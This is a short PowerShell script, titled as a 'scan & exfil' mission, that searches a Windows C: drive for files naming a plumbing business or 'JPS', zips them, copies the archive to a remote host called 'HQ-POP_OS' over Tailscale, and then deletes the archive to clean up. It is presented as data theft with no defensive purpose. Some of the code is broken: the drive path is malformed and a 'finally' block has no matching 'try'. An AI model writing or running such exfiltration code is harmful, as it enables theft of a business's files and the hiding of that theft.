# S C R Y P T  K E E P E R
# Mission: JIMENEZ PLUMBING SCAN & EXFIL
$target = "JIMENEZ PLUMBING"

# Scan C: drive for target keyword OR 'JPS'
$files = Get-ChildItem -Path "$env:C:\" -Recurse | Where-Object { $_.FullName -like "*$target*" -or $_.FullName -like "*JPS*" }

if ($files.Count -gt 0) {
    # Create ZIP of found files
    $zipPath = "$env:TEMP\JPS_Exfil_Full.zip"
    Compress-Archive -Path $files.FullName -DestinationPath $zipPath
    
    # Exfiltrate via Tailscale pipe to HQ-POP_OS:
    Start-Process "tailscale file cp" -ArgumentList "$zipPath", "HQ-POP_OS:" -Wait
    
    Write-Host "Exfiltration Complete to HQ-POP_OS:"
} else {
    # If no files found, still report status to HQ via Tailscale
    Start-Process "tailscale file cp" -ArgumentList "$env:TEMP\status.txt", "HQ-POP_OS:" -Wait
} finally {
    # Cleanup - Remove ZIP and temporary manifest files
    if (Test-Path $zipPath) { Remove-Item $zipPath }
    Write-Host "Cleanup Complete."
}
